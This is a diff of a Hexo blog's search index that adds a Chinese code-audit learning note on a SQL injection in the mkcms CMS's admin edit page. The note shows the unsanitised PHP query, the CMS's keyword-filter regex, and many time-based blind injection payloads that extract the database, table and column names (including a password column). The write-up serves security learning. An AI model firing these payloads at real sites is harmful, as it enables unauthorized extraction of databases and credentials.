@@ -1,28 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2020/05/31/hello-world/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29807319&auto=1&height=66"></iframe>
-
-<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>dvwa审计学习</title>
     <url>/2020/05/31/dvwa%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfc2ouzv89j31c00u07tc.jpg" alt="28"></p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfc2ouzv89j31c00u07tc.jpg" alt="28"></p>
 <a id="more"></a>
 
 <h3 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h3><p>[TOC]</p>
@@ -137,6 +118,97 @@
       </categories>
       <tags>
         <tag>漏洞靶场，学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2020/05/31/hello-world/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29807319&auto=1&height=66"></iframe>
+
+<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>mkcms注入审计学习</title>
+    <url>/2020/06/01/mkcms%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd5w8cgmtj30zk0m8109.jpg" alt="32"></p>
+<a id="more"></a>
+
+<h3 id="0x00-目标"><a href="#0x00-目标" class="headerlink" title="0x00 目标"></a>0x00 目标</h3><p>本次学习目标为找出mkcms的sql注入漏洞</p>
+<h3 id="0x01-CMS目录说明"><a href="#0x01-CMS目录说明" class="headerlink" title="0x01 CMS目录说明"></a>0x01 CMS目录说明</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">核心目录</span><br><span class="line">admin	管理员目录</span><br><span class="line">data 	页面显示模板</span><br><span class="line">editor	kindeditor编辑器上传目录</span><br><span class="line">install	安装目录</span><br><span class="line">system	配置信息，数据库连接文件等</span><br><span class="line">ucenter	用户目录</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-审计工具使用"><a href="#0x02-审计工具使用" class="headerlink" title="0x02 审计工具使用"></a>0x02 审计工具使用</h3><p>对于新手来说，当然是先各种审计工具一把梭，用法师的审计工具对mkcms自动审计一波，扫出了不少漏洞。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd7yw1cjhj318r0u07c2.jpg" alt="image-20200601234539613"></p>
+<h3 id="0x03-SQL注入漏洞"><a href="#0x03-SQL注入漏洞" class="headerlink" title="0x03 SQL注入漏洞"></a>0x03 SQL注入漏洞</h3><p>主题是挖sql注入，自然是先怼注入，第一个是后台管理员修改处</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为了简洁，我删除了部分代码，留下漏洞代码,此漏洞存在admin/cms_admin_edit.php</span></span><br><span class="line">    $result = mysql_query(<span class="string">'select * from mkcms_manager where m_id = '</span>.$_GET[<span class="string">'id'</span>].<span class="string">''</span>);</span><br><span class="line">	<span class="keyword">if</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line"><span class="comment">//此处代码未做过滤，直接拼接(当时没有看安全函数，直接就刚了)</span></span><br></pre></td></tr></table></figure>
+
+<p>代码是这样的</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd8ehyd4uj31490u07hi.jpg" alt="image-20200602000039646"></p>
+<p>直接抓包做测试，使用审计工具中的mysql数据库监控工具，长这样子</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd8hpfgjxj31hj0u0myz.jpg" alt="image-20200602000344692"></p>
+<p>万事俱备，只差测试了，各种‘、“、and 1=1、 and 1=2测试，结果？？？</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd8jr3kh7j317o0owmye.jpg" alt="image-20200602000542031"></p>
+<p>作为新手慌得一批，感觉又是各种安全函数，过滤函数，正则过滤啥的。。所以直接上sqlmap跑一波验证一下，如果这个点跑不出来，直接就放了。。毕竟小白，不会像大佬各种绕过。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd8m8f0ukj30vo0kagxx.jpg" alt="image-20200602000806115"></p>
+<p>看见这个心放下了，说明没有找错，回去翻一下，发现system下有个safe.php，内容是这样的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StopAttack</span><span class="params">($StrFiltKey,$StrFiltValue,$ArrFiltReq)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_array($StrFiltValue))&#123;</span><br><span class="line">		$StrFiltValue=implode($StrFiltValue);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrFiltReq.<span class="string">"/is"</span>,$StrFiltValue)==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"非法操作!"</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">	StopAttack($key,$value,$getfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">	StopAttack($key,$value,$postfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">	StopAttack($key,$value,$cookiefilter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正则</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>看见这段代码我是懵逼的，仔细看了下发现貌似是过滤整条SQL语句。。不确定就问了下大佬，的确是，不止是过滤sql语句也过滤xss，嗯，对大佬说这是很简单的一个正则表达式(我真垃圾，正则后面还是得好好学一波。。)</p>
+<p>可以看见这段正则匹配完整的SQL语句大致把常规的增删改查都给过滤了，盲注中的延时注入或布尔注入都阔以绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">延时注入</span><br><span class="line">	payload:</span><br><span class="line">		and if(length(database())&#x3D;6,sleep(10),1) &#x2F;&#x2F;如果数据库名&#x3D;6 页面延时10秒，失败</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeale0dojj31eg0u04bn.jpg" alt="image-20200602220203248"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">	and if(length(database())&#x3D;5,sleep(10),1) &#x2F;&#x2F;如果数据库名&#x3D;5 页面延时10秒,成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeakjmssjj31j50u0anf.jpg" alt="image-20200602220111981"></p>
+<p>验证是存在注入，并且可以用延时注入绕过正则匹配。此处需配合ascii码表来进行测试，如果对应字母的ascii码正确不会延时，错误会延时</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库名称</span><br><span class="line">	payload:http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),1,1))&#x3D;101,0,sleep(10))&#x2F;&#x2F;错误延时10秒</span><br></pre></td></tr></table></figure>
+
+<p>101==e，而数据库第一个字符为m==109</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeax8nlv6j31fx0u0qgd.jpg" alt="image-20200602221326238"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">	http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),1,1))&#x3D;109,0,sleep(10))&#x2F;&#x2F;正确立即返回</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeayize5oj31iw0u0tju.jpg" alt="image-20200602221440660"></p>
+<p>以此类推</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库第二个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),2,1))&#x3D;107,0,sleep(10))</span><br><span class="line"></span><br><span class="line">数据库第三个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),3,1))&#x3D;99,0,sleep(10))</span><br><span class="line"></span><br><span class="line">数据库第四个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),4,1))&#x3D;109,0,sleep(10))</span><br><span class="line"></span><br><span class="line">数据库第五个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),5,1))&#x3D;115,0,sleep(10))</span><br><span class="line">	</span><br><span class="line">数据库名称为：mkcms</span><br></pre></td></tr></table></figure>
+
+<p>判断数据库中一共有多少张表，由于cms过滤了引号，所以将数据库名转成hex</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select count(table_name) from information_schema.tables where table_schema&#x3D;0x6D6B636D73)&#x3D;17,sleep(5),0)&#x2F;&#x2F;如果数据库中有17个表，延时5秒</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查询数据库的第一个表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: </span><br><span class="line">&#x2F;&#x2F;判断数据库第一张表名长度为8</span><br><span class="line">and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)&#x3D;8,0,sleep(5))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第一张表的对应字符为对应ascii码，立即返回，反之延时5秒</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),1,1)))&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;k</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),2,1)))&#x3D;107,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;c</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),3,1)))&#x3D;99,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),4,1)))&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;s</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),5,1)))&#x3D;115,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;_</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),6,1)))&#x3D;95,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;a</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),7,1)))&#x3D;97,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;d</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),8,1)))&#x3D;100,0,sleep(5))</span><br><span class="line"></span><br><span class="line">得出数据库第一张表名为：mkcms_ad</span><br></pre></td></tr></table></figure>
+
+<p>逐步查询多个表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询第n个表的表名长度,修改n即可</span><br><span class="line">and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;个数,0,sleep(5))</span><br><span class="line">查询第n个表的表名，修改n即可</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),1,n)))&#x3D;ascii码,0,sleep(5))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查询列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;查询mkcms_manager共有9列</span><br><span class="line">	and if((select count(column_name) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572)&#x3D;9,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;判断第一个列名的长度</span><br><span class="line">and if((select length(column_name) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0,1)&#x3D;4,0,sleep(5))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;判断某个列名长度，修改即可</span><br><span class="line">and if((select length(column_name) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit n,1)&#x3D;长度,0,sleep(5))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;猜解第一个列名</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr(column_name,1(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;_</span><br><span class="line">and if((select ascii(substr(column_name,2(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;95,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;i</span><br><span class="line">and if((select ascii(substr(column_name,3(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;105,0,sleep(5)i</span><br><span class="line">&#x2F;&#x2F;d</span><br><span class="line">and if((select ascii(substr(column_name,4(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;100,0,sleep(5))</span><br><span class="line"></span><br><span class="line">第一个列名为：m_id</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;猜解第二个列名</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr(column_name,1(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;_</span><br><span class="line">and if((select ascii(substr(column_name,2(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;95,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;n</span><br><span class="line">and if((select ascii(substr(column_name,3(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;110,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;a</span><br><span class="line">and if((select ascii(substr(column_name,4(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;97,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr(column_name,5(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;e</span><br><span class="line">and if((select ascii(substr(column_name,6(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;101,0,sleep(5))</span><br><span class="line"></span><br><span class="line">第二个列名为m_name，以此类推</span><br><span class="line">第三个列名为m_password</span><br><span class="line">第四个列名为m_levels</span><br><span class="line">第五个列名为m_random</span><br><span class="line">第六个列名为m_status</span><br><span class="line">第七个列名为m_logintime</span><br><span class="line">第八个列名为m_loginip</span><br><span class="line">第九个列名为m_loginnum</span><br></pre></td></tr></table></figure>
+
+<p>由于手工太麻烦，建议使用sqlmap一把梭</p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
       </tags>
   </entry>
 </search>
